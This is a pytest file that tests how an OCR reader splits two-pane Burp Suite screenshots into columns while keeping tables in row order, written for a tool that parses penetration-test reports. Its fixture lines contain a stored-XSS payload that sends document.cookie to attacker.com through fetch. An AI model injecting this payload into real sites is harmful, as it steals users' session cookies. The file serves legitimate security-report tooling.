# -*- coding: utf-8 -*-
"""Two-pane screenshots must not be read across the panes.

    pytest tests/test_ocr_column_layout.py -v

WHY THIS EXISTS

A VAPT proof of concept is usually a screenshot, and a screenshot of a tool like
Burp is two panes side by side: the request on the left, the response on the
right. doctr reports where every line sits, but the reader dropped that and
emitted lines top to bottom, so the two panes came out spliced into each other:

    HTTP Request (Repeater Tab 1)        <- left
    HTTP Response (200 OK)               <- right
    POST /user/profile/update HTTP/1.1   <- left
    HTTP/1.1 200 OK                      <- right

That is not only an unreadable report. The same text is chunked, retrieved and
handed to the model as the evidence it judges the finding on, so a request and a
response interleaved line by line is a correctness problem.

THE CASE THIS MUST NOT BREAK

A table's cells sit in columns too. Reading a table column-first would separate
every label from its value -- exactly what validator gate 4 depends on
("NTP synchronized: yes", the false negative that took three wrong diagnoses).
So the split is refused when the columns pair up row by row, which is what a
table does and what two independent panes do not.

The geometry in test_the_burp_screenshot_that_prompted_this is the real output
of doctr on the screenshot that prompted the fix, not an invention.
"""
import pytest

from src.core.parsers.doc_parsers import _line_columns


# (x0, x1, y, text) in doctr's relative coordinates, straight from its export()
# for the Burp "Stored XSS" proof-of-concept screenshot.
BURP_LINES = [
    (0.02, 0.38, 0.02, "Burp Suite Professional- [Vulnerability Proof - Stored XSS]"),
    (0.03, 0.22, 0.14, "HTTP Request (Repeater Tab 1)"),
    (0.51, 0.67, 0.14, "HTTP Response (200 OK)"),
    (0.03, 0.25, 0.22, "POST /user/profile/update HTTP/1.1"),
    (0.51, 0.62, 0.22, "HTTP/1.1 200 OK"),
    (0.03, 0.22, 0.27, "Host: app.xyz-corp-internal.com"),
    (0.51, 0.70, 0.27, "Content-Type: application/json"),
    (0.03, 0.23, 0.32, "Authorization: Bearer eyJhbGci..."),
    (0.03, 0.22, 0.37, "Content-Type: application/json"),
    (0.52, 0.69, 0.42, '"message": "Profile updated",'),
    (0.52, 0.71, 0.47, '"rendered_bio": "<script>fetch..."'),
    (0.03, 0.19, 0.52, '"bio": "<script>fetch(\'http://'),
    (0.51, 0.52, 0.51, "}"),
    (0.03, 0.18, 0.57, "attacker.com/steal?c='+"),
    (0.51, 0.75, 0.57, "[ALERT] Unsanitized HTML rendered!"),
    (0.03, 0.20, 0.62, "document.cookie)</script>"),
]


def test_the_burp_screenshot_that_prompted_this():
    """The request must come out whole, then the response -- not alternating."""
    cols = _line_columns(BURP_LINES)
    assert cols is not None, "the two panes were not detected as columns"
    assert len(cols) == 2, cols

    request, response = cols
    assert "HTTP Request (Repeater Tab 1)" in request
    assert "POST /user/profile/update HTTP/1.1" in request
    assert "Host: app.xyz-corp-internal.com" in request
    assert "HTTP Response (200 OK)" in response
    assert "HTTP/1.1 200 OK" in response
    assert "[ALERT] Unsanitized HTML rendered!" in response

    # The actual defect: nothing from the response may appear inside the request.
    assert not any("HTTP/1.1 200 OK" in line for line in request)
    assert not any("POST /user/profile/update" in line for line in response)


def test_each_column_keeps_its_own_top_to_bottom_order():
    request, _response = _line_columns(BURP_LINES)
    assert request.index("POST /user/profile/update HTTP/1.1") < \
           request.index("Host: app.xyz-corp-internal.com")


# ── the regression this must not cause ───────────────────────────────────────

def _table(rows):
    """A two-column table: every row has a cell on the left and on the right."""
    lines = []
    for i, (label, value) in enumerate(rows):
        y = 0.1 + i * 0.08
        lines.append((0.05, 0.25, y, label))
        lines.append((0.50, 0.70, y, value))
    return lines


def test_a_table_is_left_alone():
    """Column-first reading would separate every label from its value.

    That is the pairing validator gate 4 exists to check, so a table must keep
    its row order -- the reader's plain top-to-bottom pass.
    """
    rows = [("NTP synchronized", "yes"), ("NTP server", "10.0.0.1"),
            ("Stratum", "3"), ("Offset", "0.002s"), ("Last sync", "2026-09-21")]
    assert _line_columns(_table(rows)) is None, (
        "a table was split into columns -- every label is now separated from "
        "its value")


def test_a_table_with_one_gap_in_it_is_still_a_table():
    """One missing cell must not be enough to call it two panes."""
    lines = _table([("NTP synchronized", "yes"), ("NTP server", "10.0.0.1"),
                    ("Stratum", "3"), ("Offset", "0.002s"),
                    ("Last sync", "2026-09-21"), ("Drift", "0.1ppm")])
    del lines[3]        # drop one right-hand cell
    assert _line_columns(lines) is None


# ── everything else keeps the behaviour it had ───────────────────────────────

def test_a_single_column_page_is_unchanged():
    lines = [(0.05, 0.60, 0.05 + i * 0.05, "line %d" % i) for i in range(10)]
    assert _line_columns(lines) is None


def test_too_few_lines_to_judge():
    lines = [(0.05, 0.20, 0.1, "a"), (0.50, 0.70, 0.1, "b"),
             (0.05, 0.20, 0.2, "c")]
    assert _line_columns(lines) is None


def test_a_narrow_side_label_does_not_make_a_column():
    """A page number or margin note is not a second pane."""
    lines = [(0.05, 0.60, 0.05 + i * 0.05, "body line %d" % i) for i in range(10)]
    lines.append((0.90, 0.95, 0.95, "12"))
    assert _line_columns(lines) is None


def test_no_text_at_all():
    assert _line_columns([]) is None


@pytest.mark.parametrize("gap", [0.0, 0.01, 0.03])
def test_columns_that_nearly_touch_are_one_column(gap):
    """Ordinary word spacing inside a wide line is not a column boundary."""
    lines = []
    for i in range(8):
        y = 0.1 + i * 0.07
        lines.append((0.05, 0.40, y, "left %d" % i))
        lines.append((0.40 + gap, 0.75, y, "right %d" % i))
    assert _line_columns(lines) is None


# ── the wiring, not just the rule ────────────────────────────────────────────

class _FakePredictor(object):
    """Stands in for doctr, returning one page in its export() shape.

    The helper above can be perfectly correct and still never run, which is the
    regression these last two tests exist for: testing _line_columns alone
    passes whether or not readtext actually calls it.
    """

    def __init__(self, lines):
        self._lines = lines

    def __call__(self, _imgs):
        return self

    def export(self):
        return {"pages": [{"blocks": [{"lines": [
            {"geometry": ((x0, y), (x1, y + 0.01)),
             "words": [{"value": w} for w in text.split(" ")]}
            for x0, x1, y, text in self._lines
        ]}]}]}


def _readtext(lines):
    from src.core.parsers.doc_parsers import _DocTRReaderAdapter
    return _DocTRReaderAdapter(_FakePredictor(lines)).readtext(None)


def test_the_reader_applies_the_column_split():
    out = _readtext(BURP_LINES)
    joined = "\n".join(out)
    req_at = joined.index("POST /user/profile/update")
    resp_at = joined.index("HTTP/1.1 200 OK")
    assert req_at < resp_at, (
        "the reader is still emitting lines top-to-bottom across both panes:\n"
        + joined)
    # Every request line precedes every response line.
    assert joined.index("document.cookie)</script>") < resp_at


def test_the_reader_leaves_a_table_in_row_order():
    rows = [("NTP synchronized", "yes"), ("NTP server", "10.0.0.1"),
            ("Stratum", "3"), ("Offset", "0.002s"), ("Last sync", "2026-09-21")]
    out = _readtext(_table(rows))
    assert out.index("yes") == out.index("NTP synchronized") + 1, (
        "the table was reordered -- 'yes' no longer follows its label: %r" % (out,))


def test_the_panes_are_separated_by_a_blank_line():
    """Correctly ordered is not the same as readable.

    Without a break the request and the response run together as one block and
    the reader has to work out where one ends -- and the proof of concept is the
    part of a VAPT report that actually gets studied.
    """
    out = _readtext(BURP_LINES)
    assert "" in out, "no blank line between the two panes: %r" % (out,)
    gap = out.index("")
    joined_before = "\n".join(out[:gap])
    joined_after = "\n".join(out[gap + 1:])
    assert "POST /user/profile/update HTTP/1.1" in joined_before
    assert "HTTP/1.1 200 OK" in joined_after
    assert "HTTP/1.1 200 OK" not in joined_before


def test_a_single_column_page_gains_no_blank_lines():
    """The separator belongs between panes, not inside ordinary text."""
    lines = [(0.05, 0.60, 0.05 + i * 0.05, "line %d" % i) for i in range(10)]
    assert "" not in _readtext(lines)
